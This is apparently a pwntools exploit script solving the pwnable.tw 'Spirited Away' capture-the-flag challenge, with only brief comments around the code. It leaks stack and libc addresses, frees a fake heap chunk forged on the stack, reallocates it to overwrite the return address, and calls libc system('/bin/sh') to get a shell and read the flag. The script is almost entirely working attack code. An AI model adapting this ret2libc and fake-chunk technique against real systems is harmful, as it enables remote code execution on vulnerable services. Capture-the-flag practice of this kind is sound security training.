#!/usr/bin/env python3

from pwn import *
import time

# ENV
PORT = 10204
HOST = "chall.pwnable.tw"
exe = context.binary = ELF('./spirited_away_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* survey+700
            b* 0x080488D3
            b* 0x08048771
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def survey(name, age, reason, comment):
    p.sendafter(b'name: ', name)
    p.sendlineafter(b'age: ', age)
    p.sendafter(b'movie? ', reason)
    p.sendafter(b'comment: ', comment)

# VARIABLE


# PAYLOAD
p.sendafter(b'name: ', b'a'*8)
p.sendlineafter(b'age: ', b'+')
p.sendafter(b'movie? ', b'a'*0x38)
# GDB()
p.sendafter(b'comment: ', b'b'*8)

# LOCAL: leak in &age
# p.recvuntil(b'Age: ')
# libc_leak = int(p.recvuntil(b'\n', drop=True), 10) & 0xffffffff
# log.info("Libc leak: " + hex(libc_leak))
# libc.address = libc_leak - libc.sym._IO_2_1_stdout_
# log.info("Libc base: " + hex(libc.address))

p.recvuntil(b'a'*0x38)
stack_leak = u32(p.recv(4))
log.info("Stack leak: " + hex(stack_leak))

p.recv(4)
libc_leak = u32(p.recv(4))
libc.address = libc_leak - libc.sym.fflush - 11
log.info("Libc base: " + hex(libc.address))

p.sendafter(b'<y/n>: ', b'y')

for i in range(8):
    survey(b'a'*8, b'+', b'a', b'b'*8)
    p.sendafter(b'<y/n>: ', b'y')

for i in range(91):
    print(i)
    p.sendline()
    p.sendlineafter(b'age: ', str(123))
    p.sendafter(b'movie? ', b'a')
    p.sendline()
    time.sleep(0.05)
    p.sendafter(b'<y/n>: ', b'y')

payload = flat(
    0, 0x41,
    b'a'*0x3c,
    0x31
    )

comment = flat(
    b'a'*0x54,
    stack_leak - 0x68
    )
# GDB()
survey(b'a'*8, b'+', payload, comment)
p.sendafter(b'<y/n>: ', b'y')

payload = flat(
    b'a'*0x4c,
    libc.sym.system,
    0,
    next(libc.search(b'/bin/sh'))
    )
survey(payload, b'+', b'a', b'b'*8)
p.sendafter(b'<y/n>: ', b'n')
p.sendline(b'cat /home/spirited_away/flag')

p.interactive()

# Leak stack -> overwrite stack into name -> free(stack) -> malloc(stack) -> ret2libc